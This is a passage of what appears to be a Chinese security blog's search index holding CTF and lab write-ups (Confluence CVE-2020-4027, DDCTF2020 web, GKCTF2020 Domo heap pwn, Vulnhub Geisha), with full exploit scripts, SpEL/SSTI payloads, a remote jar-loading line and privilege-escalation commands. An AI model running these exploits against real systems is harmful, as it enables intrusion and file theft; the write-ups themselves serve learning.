/tmp/pwned&apos;)&quot;)} 在这之前遇到大坑了，官方说受影响版本包括7.5.0，我自己搭了个7.5.0版本，包括使用测试站点，用上面的payload是会直接原样输出的，也就是被沙箱拦截了。这一度让我以为方向错了，后来换个7.4.4版本就成功了，这就很无语了。 后记水这篇文章的时间跨度好大，从九月底到现场，过了个国庆人都懈怠了。感觉写得有点乱，文中若有错误的地方，望各位师傅不吝斧正。 参考https://securitylab.github.com/advisories/GHSL-2020-045-atlassian_confluence/ https://securitylab.github.com/advisories/GHSL-2020-048-apache-velocity/ https://twitter.com/XiaoC75068775/status/1309673425984610306 https://www.cnblogs.com/jinshiyill/p/5240906.html","link":"/2021/10/20/Confluence模板注入（CVE-2020-4027）复现/"},{"title":"DDCTF2020 WEB writeup","text":"前言DDCTF是个挺好的比赛，题目质量很高，py程度很低。不知道今年为什么这么少队伍签到，难道跟别的比赛撞车了？ Web签到题根据提示得知有来个api。 12345678910111213141516171819202122232425 Interface documentation- login interface[-][Safet Reminder]The Private key cannot use request parameterRequestMethod | POSTURL | http://117.51.136.197/admin/loginParam | username str | pwd strResponsetoken str | auth(Certification information)- auth interfaceRequestMethod | POSTURL | http://117.51.136.197/admin/authParam | username str | pwd str | token strResponseurl str | client download link+------------------+ +----------------------+ +--------------------+| | | | | || +----------------&gt; +----------------&gt; || Client(Linux) | | Auth/Command | | minion || &lt;----------------+ +&lt;---------------+ || | | | | |+------------------+ +----------------------+ +--------------------+ 访问第一个api，得到一串字符串，解码得知是jwt token。 尝试一轮jwt的常规操作，最后用jwtcrack爆破出了密钥，修改payload中的userRole为ADMIN提交到第二个api处。 得到了client的下载地址。 运行下client，发现并没有用户交互功能，命令都是硬编码在程序里。 12345678910111213141516171819202122232425262728293031┌─[p1ay2win@parrot]─[~/Desktop/Tools/c-jwt-cracker-master]└──? $/tmp/client 2020/09/07 00:50:15 ____ _ ____ _ ____ _____ _____ ____ ____ ____ ____ / _ \\/ \\/ _ \\/ \\/ _\\/__ __\\/ / /_ \\/ _ \\/_ \\/ _ \\| | \\|| || | \\|| || / / \\ | __\\_____ / /| / \\| / /| / \\|| |_/|| || |_/|| || \\__ | | | | \\____\\/ /_| \\_/|/ /_| \\_/|\\____/\\_/\\____/\\_/\\____/ \\_/ \\_/ \\____/\\____/\\____/\\____/ 2020/09/07 00:50:15 +---------------------------------------------------+|Flag Path := /home/dc2-user/flag/flag.txt ||签名格式 := command|time_stamp |+---------------------------------------------------+2020/09/07 00:50:15 +------------------+ +----------------------+ +--------------------+| | | | | || +----------------&gt; +----------------&gt; || Client | | Auth/Command | | minion || &lt;----------------+ +&lt;---------------+ || | | | | |+------------------+ +----------------------+ +--------------------+2020/09/07 00:50:15 [*]Start ping master...2020/09/07 00:50:15 [-]http://117.51.136.197/server/health connect succuess2020/09/07 00:50:15 [*]Start send command to minions...2020/09/07 00:50:15 [+]get sign:Q4OkAWjsnkfxKiqMv5wuFRXjgS/gGEFalDPS5IfuGww=, command:&apos;DDCTF&apos;, time_stamp:15994110152020/09/07 00:50:15 [+]send command url http://117.51.136.197/server/command and response:{&quot;code&quot;:0,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:&quot;DDCTF&quot;} 抓包分析确实都是http的流量，参数通过json格式传递，还有个signature参数验证命令有没有被篡改。 本来想着通过IDA来修改原命令，但是只能修改到长度为8的命令。最后队友通过恢复符号表得知签名是命令加时间戳的HMAC-sha256，密钥为DDCTFWithYou。 写了py测试下发现不会执行命令，但存在SSTI。 手动fuzz了下，发现拦截了getClass、forName等等、classLoader没法打开url、exec直接状态码500，可能直接把Runtime的包给删了。 现在唯有文件读取能用，最后用到两个SSTI的payload，一个读目录，一个读文件： 12(new java.io.File(\"/home/dc2-user/flag\")).list()T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(\"/home/dc2-user/flag/flag.txt\")) EXP: 1234567891011121314151617181920212223242526import timeimport hmacimport base64import jsonimport sysimport requestsfrom hashlib import sha256appsecret = \"DDCTFWithYou\".encode('utf-8')# command = '(new java.io.File(\"/home/dc2-user/flag\")).list()'command = 'T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(\"/home/dc2-user/flag/flag.txt\"))'timestamp = int(time.time())tmp = \"{}|{}\".format(command,timestamp).encode('utf-8')signature = base64.b64encode(hmac.new(appsecret, tmp, digestmod=sha256).digest())data = {}data['signature'] = signaturedata['command'] = commanddata['timestamp'] = timestampurl = 'http://117.51.136.197/server/command'headers = {'Content-Type': 'application/json'}r = requests.post(url=url,headers=headers,data = json.dumps(data))print(r.text) Easy Web尝试登录下，看到Response Headers利用rememberMe=deleteMe，得知后端有Apache Shiro。 Shiro反序列化一把梭，打了个寂寞，毕竟哪有这么容易。众所周知在ctf里： Easy不是真的easy，hard是真的hard。 在队友提醒下得知是CVE-2020-11989，Shiro权限绕过。一个斜杆加分号进入到后台。 1http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index 一眼看到了任意文件读取，陆陆续续读到了web.xml、spring的配置文件和配置文件里能看到的class。 1234567891011/WEB-INF/web.xml/WEB-INF/classes/com/ctf/util/SafeFilter.class/WEB-INF/classes/spring-core.xml/WEB-INF/classes/spring-web.xml/WEB-INF/classes/spring-shiro.xml/WEB-INF/classes/com/ctf/auth/FilterChainDefinitionMapBuilder.class/WEB-INF/classes/com/ctf/auth/ShiroRealm.class/WEB-INF/classes/com/ctf/model/User.class/WEB-INF/classes/com/ctf/model/Role.class/WEB-INF/classes/com/ctf/service/UserService.class/WEB-INF/classes/com/ctf/model/Permission.class 注意到两类，一个参数的值过滤了一些java的关键字，另一个记录了些链接。 打开最后一个链接，不知道怎么的就变成了admin用户，提供了一个输入框。 1http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/ 测试下存在SpEL注入，输入[[${7*7}]]最后打开的结果是49。 参数过滤了很多关键字，但没过滤ClassLoader关键字，用UrlClassLoader试下发现可以连外网。 1new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(&quot;http://dnslog.cn/xxx.jar&quot;)}).loadClass(&quot;xxx&quot;).getConstructor().newInstance().toString() 当然，由于过滤了引号，字符串要用下面的py脚本转换下。 123456payload = \"PUT PAYLOAD STRING HERE\"print (\"true.toString().charAt(0).toChars(%d)[0].toString()\" % ord(payload[0]), end='')for i in range(1, len(payload)): print (\".concat(true.toString().charAt(0).toChars(%d)[0].toString())\" % ord(payload[i]), end='')print (\"\") 把编译好的class打包成jar扔到vps上，本来想着直接执行命令，但是命令并没有执行成功，有时还会报error，我还以为是代码的问题，折腾了好久。 最后还是以文件读取的方式读flag。 1234567891011121314151617181920212223242526272829303132import java.io.*;import java.util.*;public class Cmd { String res; public Cmd(){ try { File dir = new File(\"/\"); String[] children = dir.list(); if (children == null) { } else { for (int i=0; i&lt; children.length; i++) { String filename = children[i]; res += filename+'\\n'; } } BufferedReader in = new BufferedReader(new FileReader(\"/flag_is_here\")); String str; while ((str = in.readLine()) != null) { res += str+'\\n'; } } catch (IOException e) { } } @Override public String toString() { return res; }} jar打包命令如下 12javac .\\Cmd.javajar cvf Cmd.jar .\\Cmd.class 可惜最后做出来才知道比赛时间已经过了。。 参考 Apache Shiro权限绕过漏洞分析(CVE-2020-11989) 都0202年了老嗨还在用的 - 各种姿势jsp webshell Exploiting SSTI in Thymeleaf EXPRESSION LANGUAGE INJECTION RCE - NO STRINGS ATTACHED","link":"/2020/09/07/DDCTF2020_WEB_writeup /"},{"title":"[PWN]GKCTF 2020 Domo分析","text":"前言这道题真心觉得出得不错，一道题学到了很多新的知识。 感谢出题人starssgo师傅和nocbtm师傅的思路和writeup，下面就来详细分析一下解题思路和其中用到的解题技巧。 存在的漏洞 off by null 1234567891011121314151617181920212223242526272829303132unsigned __int64 cmd_add(){ size_t nbyte; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); if ( (unsigned int)sub_C16() == 1 &amp;&amp; count &lt;= 8 ) { for ( HIDWORD(nbyte) = 0; SHIDWORD(nbyte) &lt;= 8; ++HIDWORD(nbyte) ) { if ( !ptr[SHIDWORD(nbyte)] ) { puts(\"size:\"); _isoc99_scanf(\"%d\", &amp;nbyte); if ( (nbyte &amp; 0x80000000) == 0LL &amp;&amp; (signed int)nbyte &lt;= 288 ) { ptr[SHIDWORD(nbyte)] = malloc((signed int)nbyte); puts(\"content:\"); read(0, ptr[SHIDWORD(nbyte)], (unsigned int)nbyte); *((_BYTE *)ptr[SHIDWORD(nbyte)] + (signed int)nbyte) = 0; ++count; } else { puts(\"sobig\"); } return __readfsqword(0x28u) ^ v2; } } } return __readfsqword(0x28u) ^ v2;} 添加用户这个函数这里，在输入完内容之后，会加个\\x00进行截断，然而加\\x00的位置是他的size位置，超出了他的空间大小。这样就能修改下一个chunk的szie，实现改pre_inuse和改小下一个chunk的size。 又因为是size位置改成\\x00，输入的size稍不注意就会错改了什么东西-_-!，这都是后话。 任意地址写 1234567891011121314151617181920212223242526272829unsigned __int64 __fastcall cmd_edit(_DWORD *a1, _DWORD *a2, _DWORD *a3){ _DWORD *v4; // [rsp+8h] [rbp-28h] void *buf; // [rsp+20h] [rbp-10h] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v4 = a3; v6 = __readfsqword(0x28u); buf = 0LL; if ( (unsigned int)sub_C16() == 1 ) { if ( *a1 &amp;&amp; *a2 &amp;&amp; *v4 ) { puts(\"addr:\"); _isoc99_scanf(\"%ld\", &amp;buf); puts(\"num:\"); read(0, buf, 1uLL); *a1 = 0; *a2 = 0; *v4 = 0; puts(\"starssgo need ten girl friend \"); } else { puts(\"You no flag\"); } } return __readfsqword(0x28u) ^ v6;} 这里很容易就看出来了，输入任意地址，修改最后一个字节，且只有改一次的机会。 利用过程以下代码块除了exp外，index都是代码块内从0算起的相对index。 0x0 leak libc address和heap address对于libc address，要先创一个size大于80，既free后会进入unsorted bin的chunk，再创一个chunk垫底，防止top chunk会跟unsorted bin合并。删除第一个chunk进入unsorted bin，被删除的chunk的fd和bk就会有指向main_arena范围的地址。 123cmd_add(0xf0,'')cmd_add(0x10,'')cmd_del(0) 然后再申请与这个unsorted binchunk同样大小的chunk，内容输入为空，因为我这里用的是sendline，换行符\\x0a会覆盖fd的最后一个字节，这里\\x00对fd没影响。 用show函数就能输出main_arena的地址，又因为main_arena的地址相对libc地址的偏移是一定的，所以能够计算出libc地址。具体偏移是多少可以用gdb的vmmap命令计算出来。 12cmd_add(0xf0,'')main_arena = u64(cmd_show(0).ljust(8,'\\x00')) + offset leak heap address的思路差不多，创两个同样小的chunk，再都free掉进fastbins。第二个free的chunk的fd会指向第一free的chunk，然后一样重新申请一个同样大小的chunk，写入内容空，再输出。 12345cmd_add(0x10,'')cmd_add(0x10,'')cmd_del(0)cmd_add(0x10,'')main_arena = u64(cmd_show(0).ljust(8,'\\x00')) + offset 这里输入的size要设计得当，不然一不小心就覆盖了后面chunk的size。特别后面fastbins attack时候不对齐的fake chunk，我在这里踩了不少坑。 0x01 chunk overlapchunk overlap这部分我申请三个chunk，输入的size分别是0x40、0x68和0xf0。第一个chunk放fake chunk，第二个chunk修改fake chunk的next_size，因为第三个chunk的size是0x101，顺便用off by null修改第三个chunk的pre_inuse，而第三个chunk的作用纯粹是它的pre_inuse被修改后，根据它的pre_size向前unlink。 还有就是fake chunk那个要伪造下fd和bk指向自己，前面有了head addr，在fake chunk的0x18处放fake chunk的地址，令fake chunk-&gt;fd-&gt;bk=fake chunk且fake chunk-&gt;bk-&gt;fd=fake chunk就OK。 题目的edit函数非常规edit，想修改chunk得free掉再重新申请。 123456cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_add(0x68,'')cmd_add(0xf0,'')cmd_del(1)cmd_add(0x68,flat('\\x00'*0x60,0xb0))cmd_del(2) free第三块chunk前堆的情况： free第三块chunk后，堆成功重叠： 这时候就可以控制第二个chunk为所欲为。 0x02 fastbins attack经过上面的步骤，将堆的情况简单化一下就是还有一个size为0x50的chunk且index为0，一个size为0x70的chunk且index为1和一个大的unsorted bins。 为了好操作一点，先申请一个chunk占着准备用来修改index为1的chunk；然后申请一个size为0x70的chunk，并立即free掉，再free掉szie同为0x70的index为1的chunk；最后，利用占着位的chunk修改第二个free的0x70的chunk，原本指向第一个free的0x70的chunk的fd为想要任意读写的fake chunk的地址。 123456cmd_add(0xc0,'') # index 2cmd_add(0x60,'') # index 3cmd_del(3)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk)) 此时堆中的情况： 到这里fastbins attack还没完成，由于思路的不同，后面的利用步骤会有所不同。先说说nocbtm师傅的思路。在_IO_2_1_stdin_既stdin文件流结构体的指针里有个vtable变量。 vtable变量的值为_IO_file_jumps的指针，_IO_file_jumps中保存了一些函数指针，一系列标准IO函数中会调用这些函数指针，但_IO_file_jumps里的内容是无法修改的，但可以修改vtable指向伪造的_IO_file_jumps从而getshell。 在_IO_2_1_stdin_ + 160 - 0x3刚好能作为fake chunk的size，通过fastbins attack到这里修改vtable。 123456789101112fake_chunk = _IO_2_1_stdin_ + 160 - 0x3cmd_add(0xc0,'') # index 2cmd_add(0x60,'') # index 3cmd_del(3)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk)) # overwrite fdcmd_add(0xa8,p64(0)*2+p64(one_gadget)*19) # fake vtablefake_vtable = head_addr + offsetpayload = '\\x00'*3+flat(0,0,0xffffffff,0,0,fake_vtable,0,0,0,0,0,0)cmd_add(0x60,'')cmd_add(0x63,payload) 这里通过one_gedget就已经getshell了。 还有另一种思路就是出题人的思路，libc的environ里记着stack的地址。 用同样是_IO_FILE的_IO_2_1_stdout_，控制了其中_IO_write_base、_IO_write_ptr和flag，就能任意地址读取。_IO_write_base为读取的起始地址，_IO_write_ptr为读取的末地址，并且flag的值要得是0xfbad1800才能正常读取，至于是为什么，在后面参考的最后一条有说，但我是没看懂-_-!。在_IO_2_1_stdout_ - 0x43的地方找到个合适的fake chunk的size，其他地方的填充就用原来的值_IO_2_1_stdout_ + 131就行。 在修改成功之后再去_IO_2_1_stdout_那看还是没改那样的，但是能接收到输出的，可能是输出完就恢复了。 1234567891011fake_chunk = _IO_2_1_stdout_ - 0x43cmd_add(0xc0,'') # index 2cmd_add(0x60,'') # index 3cmd_del(3)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk)) # overwrite fdpayload = '\\x00'*3+flat(0,0,0,0,0,'_IO_file_jumps',0xfbad1800,_IO_2_1_stdout_+131,_IO_2_1_stdout_+131,_IO_2_1_stdout_+131,libc.sym['environ'],libc.sym['environ']+8)cmd_add(0x60,'')cmd_add(0x63,payload)stack_addr = u64(p.recv(6).ljust(8,'\\x00')) 前面从environ读栈地址就是为了改返回地址控制EIP，_IO_2_1_stdin_的任意地址写跟_IO_2_1_stdout_的任意地址读类似，也是需要控制flag还有_IO_buf_base和_IO_buf_end。 这里说下我用非对齐的位置做这次fake chunk的size时会出错，用出题人的方法，任意地址写的函数写一字节作为size的方法却没问题，还有为了payload前加5\\n顺便退出程序，写入到_IO_buf_base的返回地址要-2以接收5\\n。这回除了flag、_IO_buf_base和_IO_buf_end外，其余位置用0填充即可。 123456789101112fake_chunk = _IO_2_1_stdin_ - 0x28ret_addr = stack_addr + offsetcmd_add(0x60,'')cmd_del(4)cmd_del(2)cmd_del(1)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk))cmd_add(0x40,'flag\\x00') # save orw outputcmd_add(0x60,'')payload = flat(0,_IO_file_jumps,0,0xfbad1800,0,0,0,0,0,0,ret_addr-2,ret_addr+0x118)cmd_edit(stdin_hook-0x20,'\\x7f')cmd_add(0x60,payload) 因为有seccomp的沙箱，改main函数的返回地址为gadget是没法getshell的。禁了些危险的syscall，只能用orw（open,read,write），所以前面content为flag的chunk是要open的文件名，和顺便用来存输出。还有要注意文件名要截断，之前没注意，怪不得一直都读不到flag-_-!。 123456789prdi = libc.search(asm(\"pop rdi\\nret\")).next()prsi = libc.search(asm(\"pop rsi\\nret\")).next()prdx = libc.search(asm(\"pop rdx\\nret\")).next()open_addr = libc.sym['open']read_addr = libc.sym['read']write_addr = libc.sym['write']filename_addr = heap_addr + 0x210orw = flat(prdi,filename_addr,prsi,72,open_addr,prdi,3,prsi,filename_addr+0x8,prdx,0x30,read_addr,prdi,1,prsi,filename_addr+0x8,prdx,0x100,write_addr)p.sendlineafter('&gt; ','5\\n'+orw) 返回地址覆盖上了ROP，对了，这里的ROP用的是libc的。毕竟知道了libc的地址，libc的ROP偏移是一定的，ELF的好像不是，用起来比较麻烦。 贴上expgetshell的exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192# -*- coding: utf-8 -*-from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './domo'elf = ELF('./domo')if sys.argv[1] == 'l': p = process('./domo') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',28773) libc = context.binary.libcdef cmd_add(size,content): p.sendlineafter('&gt; ','1') p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content)def cmd_del(index): p.sendlineafter('&gt; ','2') p.sendlineafter('index:',str(index))def cmd_show(index): p.sendlineafter('&gt; ','3') p.sendlineafter('index:\\n',str(index)) return p.recv(6)def cmd_edit(addr,num): p.sendlineafter('&gt; ','4') p.sendlineafter('addr:',str(addr)) p.sendlineafter('num:',num)cmd_add(0x40,'') # 0cmd_add(0x60,'') # 1# leak main_arenacmd_add(0xf0,'') # 2cmd_add(0x10,'') # 3offset = 0x7ffff7bcdb78 - 0x7ffff7bcdb0acmd_del(2)cmd_add(0xf0,'')main_arena = u64(cmd_show(2).ljust(8,'\\x00')) + offsetoffset = 0x7f3d7a680b78 - 0x7f3d7a2bc000libc.address = main_arena - offsetprint(hex(main_arena))print(hex(libc.address))# gdb.attach(p)# leak heap_addrcmd_add(0x10,'') # 4cmd_del(3)cmd_del(4)cmd_add(0x10,'')heap_addr = u64(cmd_show(3).ljust(8,'\\x00')) - 0x10a + 0x10print(hex(heap_addr))# gdb.attach(p)# overlappingcmd_del(0)cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_del(1)cmd_add(0x68,flat('\\x00'*0x60,0xb0))cmd_del(2)# gdb.attach(p)# fastbins attack overwrite vtable_IO_file_jumps = libc.sym['_IO_file_jumps']_IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']fake_chunk = _IO_2_1_stdin_ + 160 - 0x3fake_vtable = heap_addr + 0x210one_gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget = libc.address + one_gadgets[2]print(hex(_IO_file_jumps))print(hex(_IO_2_1_stdin_))print(hex(fake_vtable))print(hex(one_gadget))cmd_add(0xc0,'')cmd_add(0x60,'')cmd_del(4)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk))cmd_add(0xa8,p64(0)*2+p64(one_gadget)*19)payload = '\\x00'*3+flat(0,0,0xffffffff,0,0,fake_vtable,0,0,0,0,0,0)cmd_add(0x60,'')gdb.attach(p)cmd_add(0x63,payload)p.interactive() 读flag的exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120# -*- coding: utf-8 -*-from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './domo'elf = ELF('./domo')if sys.argv[1] == 'l': p = process('./domo') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',29288) libc = context.binary.libcdef cmd_add(size,content): p.sendlineafter('&gt; ','1') p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content)def cmd_del(index): p.sendlineafter('&gt; ','2') p.sendlineafter('index:',str(index))def cmd_show(index): p.sendlineafter('&gt; ','3') p.sendlineafter('index:\\n',str(index)) return p.recv(6)def cmd_edit(addr,num): p.sendlineafter('&gt; ','4') p.sendlineafter('addr:',str(addr)) p.sendlineafter('num:',num)cmd_add(0x40,'') # 0cmd_add(0x60,'') # 1# leak main_arenacmd_add(0xf0,'') # 2cmd_add(0x10,'') # 3offset = 0x7ffff7bcdb78 - 0x7ffff7bcdb0acmd_del(2)cmd_add(0xf0,'')main_arena = u64(cmd_show(2).ljust(8,'\\x00')) + offsetoffset = 0x7f3d7a680b78 - 0x7f3d7a2bc000libc.address = main_arena - offsetprint(hex(main_arena))print(hex(libc.address))# gdb.attach(p)# leak heap_addrcmd_add(0x10,'') # 4cmd_del(3)cmd_del(4)cmd_add(0x10,'')heap_addr = u64(cmd_show(3).ljust(8,'\\x00')) - 0x10a + 0x10print(hex(heap_addr))# gdb.attach(p)# overlappingcmd_del(0)cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_del(1)cmd_add(0x68,flat('\\x00'*0x60,0xb0))cmd_del(2)# gdb.attach(p)# fastbins attack leak stack addrenviron_addr = libc.sym['environ']stdout_hook = libc.sym[\"_IO_2_1_stdout_\"]_IO_file_jumps = libc.sym['_IO_file_jumps']fake_chunk = stdout_hook - 0x43print(hex(environ_addr))print(hex(stdout_hook))cmd_add(0xc0,'')cmd_add(0x60,'')cmd_del(4)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk))payload = '\\x00'*3+flat(0,0,0,0,0,libc.sym['_IO_file_jumps'],0xfbad1800,stdout_hook+131,stdout_hook+131,stdout_hook+131,environ_addr,environ_addr+8)cmd_add(0x60,'')cmd_add(0x68,payload)p.recvline()ret_addr = u64(p.recv(6).ljust(8,'\\x00')) - 0xf0print(hex(ret_addr))# overwrite return addressstdin_hook = libc.sym[\"_IO_2_1_stdin_\"]print(hex(stdin_hook))# fake_chunk = stdin_hook - 0x13 # maclloc函数会出错fake_chunk = stdin_hook - 0x28print(hex(fake_chunk))cmd_add(0x60,'')cmd_del(5)cmd_del(2)cmd_del(1)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk))cmd_add(0x40,'flag\\x00')cmd_add(0x60,'')# payload = '\\x00'*3+flat(0xfbad1800,0,0,0,0,0,0,ret_addr-2,ret_addr+8,0,0,0)payload = flat(0,_IO_file_jumps,0,0xfbad1800,0,0,0,0,0,0,ret_addr-2,ret_addr+0x118) # 减2为了放5\\nprint(hex(len(payload)))# gdb.attach(p)cmd_edit(stdin_hook-0x20,'\\x7f')cmd_add(0x60,payload)prdi = libc.search(asm(\"pop rdi\\nret\")).next()prsi = libc.search(asm(\"pop rsi\\nret\")).next()prdx = libc.search(asm(\"pop rdx\\nret\")).next()open_addr = libc.sym['open']read_addr = libc.sym['read']write_addr = libc.sym['write']filename_addr = heap_addr + 0x210orw = flat(prdi,filename_addr,prsi,72,open_addr,prdi,3,prsi,filename_addr+0x8,prdx,0x30,read_addr,prdi,1,prsi,filename_addr+0x8,prdx,0x100,write_addr)print(hex(len(orw)))gdb.attach(p)p.sendlineafter('&gt; ','5\\n'+orw)p.interactive() 后记再说一遍，这题出得真不错，学到了很多东西，特别是关于_IO_FILE知识点。说句老话，心细挖天下，我做这题时候不够细心，以至于踩了不少坑，而且前面两个师傅水平很高，对于这题用到的技巧都很熟练了，所以写的writeup有些细节没说，我这菜鸡缺少些前置的知识，有些地方看不懂，所以写了这篇水文，也为后面的师傅填填坑。 参考GKCTF_pwn_Domo(出题人角度) GKCTF pwn writeup _IO_FILE利用思路总结 利用stdout来处理无leak的堆题","link":"/2020/05/27/GKCTF 2020 Domo分析/"},{"title":"GKCTF_2020_Writeup","text":"前言题目总体好像不太难，题目质量也可以。web在比赛时候做出3道题，马马虎虎，pwn题肝了很久也没做出来，赛后花了两天才研究透，以至于现在才发writeup，还是菜，不过也通过这题学到了很多。 比赛那天本来一早有网课，边上课边做题，但是爷爷在我还在上课时候硬拉我去喝早茶-_-!… WEBCheckIN打开直接给了源码，小小的一个webshell，估摸着可能能绕waf。 习惯性的看了下phpinfo，发现ban了可以执行命令的函数。这时候当然是上神器蚁剑，但是各种模式都没法bypassdisable_functions。 其中PHP7的那个模式可能是web目录不可写的原因，所以不成功。直接上传exp到/tmp目录，include一下它就行了。 cve版签到题目给了提示是cve-2020-7066，在官网找到了一个example，估计题目也是差不多的代码。 依据hint，照着官网的example截断。又出来一个hint要求host要以123结尾，这时我对localhost、127.0.0.1各种@123、:123、/?123……最后发现用127.0.0.123就行…… 老八小超市儿开局一个开源商城系统，估摸着又要代码审计了。网站最下方的官网提供了github的源码下载链接，又因为最近是特殊时期，源码下载得特别慢，遂去gtihub看下commit，看能不能找到些有用的东西。 所以给我发现了1.8.0版本之后的commit有个tp漏洞同步修复 。 搜了一下在seebug的一篇文章里发现是thinkphp5.1.X的REC漏洞，但是用exp怎么打也没成功执行命令。于是等源码装好了，开debug模式看看是怎么回事。 装好发现默认密码是这个系统的名字，大胆猜测题目的密码也没有改（手动滑稽） 就这样轻松的进入了后台，应用中心这个功能很引人注目，似乎来到了挖洞时候的老套路。 不出所料，每个应用包的controller目录里都有几个php文件，于是乎在后台管理的php文件里插入个一句话，再重新打包上传安装。 1http://06d4e07c-9491-4c5d-86a6-8c98c12b59b1.node3.buuoj.cn/admin.php?s=/plugins/index/pluginsname/goodssales/pluginscontrol/admin/pluginsaction/index.html 在管理页面那就能getshell，蚁剑连接的时候要带上cookie。在根目录发现了假flag，说真的flag在/root目录里，但现在的用户进不去/root目录，但是根目录看见个shell脚本比较明显，内容为每60秒执行一个python脚本。 用蚁剑的模拟终端看见这个脚本是以root用户运行的。 好在那个python脚本可写，顺理成章读flag。 REVERSE这题其实很简单，但我在比赛时候粗心大意没做出来-_-! IDA直接搜索字符串，发现串奇怪的字符串，看起来不像是base64。当时我去在线的base58解码的时候错把编码当解码，又没仔细看-_-! PWNpwn题就看了一题，题目是真心觉得出得不错 Domo在比赛时没做出来，赛后复现了下。 先贴一下exp，思路等会再水一文细说。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091# -*- coding: utf-8 -*-from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './domo'elf = ELF('./domo')if sys.argv[1] == 'l': p = process('./domo') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',28773) libc = ELF('./libc.so.6')def cmd_add(size,content): p.sendlineafter('&gt; ','1') p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content)def cmd_del(index): p.sendlineafter('&gt; ','2') p.sendlineafter('index:',str(index))def cmd_show(index): p.sendlineafter('&gt; ','3') p.sendlineafter('index:\\n',str(index)) return p.recv(6)def cmd_edit(addr,num): p.sendlineafter('&gt; ','4') p.sendlineafter('addr:',str(addr)) p.sendlineafter('num:',num)cmd_add(0x40,'') # 0cmd_add(0x60,'') # 1# leak main_arenacmd_add(0xf0,'') # 2cmd_add(0x10,'') # 3offset = 0x7ffff7bcdb78 - 0x7ffff7bcdb0acmd_del(2)cmd_add(0xf0,'')main_arena = u64(cmd_show(2).ljust(8,'\\x00')) + offsetoffset = 0x7f3d7a680b78 - 0x7f3d7a2bc000libc.address = main_arena - offsetprint(hex(main_arena))print(hex(libc.address))# gdb.attach(p)# leak heap_addrcmd_add(0x10,'') # 4cmd_del(3)cmd_del(4)cmd_add(0x10,'')heap_addr = u64(cmd_show(3).ljust(8,'\\x00')) - 0x10a + 0x10print(hex(heap_addr))# gdb.attach(p)# overlappingcmd_del(0)cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_del(1)cmd_add(0x68,flat('\\x00'*0x60,0xb0))cmd_del(2)# gdb.attach(p)# fastbins attack overwrite vtable# _IO_file_jumps = libc.sym['_IO_file_jumps']_IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']fake_chunk = _IO_2_1_stdin_ + 160 - 0x3fake_vtable = heap_addr + 0x210one_gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget = libc.address + one_gadgets[2]print(hex(_IO_file_jumps))print(hex(_IO_2_1_stdin_))print(hex(fake_vtable))print(hex(one_gadget))cmd_add(0xc0,'')cmd_add(0x60,'')cmd_del(4)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk))cmd_add(0xa8,p64(0)*2+p64(one_gadget)*19)payload = '\\x00'*3+flat(0,0,0xffffffff,0,0,fake_vtable,0,0,0,0,0,0)cmd_add(0x60,'')# gdb.attach(p)cmd_add(0x63,payload)p.interactive() 参考get_headers() silently truncates after a null byte Thinkphp5 远程代码执行漏洞事件分析报告","link":"/2020/05/26/GKCTF_2020_Writeup/"},{"title":"Geisha walkthrought","text":"前言准备接受社会毒打，先找几个靶机打打，提高内网、后渗透水平，免得不会深入就说你noob，疯狂踩。 起手先去vulnhub找了个入门到中间难度的靶机Geisha(叫给啥？？)，目标：Get the root shell and then obtain flag under /root)。 利用把所有端口都扫了一遍，发现开启了ftp、ssh和很多http服务的端口。 每个http服务主页都是一张图片，没什么功能，但其中在7125端口扫到了passwd和shadow，passwd能下载下来。在shadow里看见有两个账号可登录分别是root和geisha，于是用hydra跑下弱口令。 用个小字典一下子就跑出来了，事情发展到目前为止似乎还挺顺利。 但是uname -a看下靶机的发行版本挺新的，偷瞄了下别人的walkthough，发现是利用SUID可执行文件运行时可暂时获得文件拥有者的权限的这个特点来提权的（新技能get）。 使用命令find / -perm -u=s -type f 2&gt;/dev/null搜索所有SUID可执行文件，发现个base32可以用来任意文件读取。 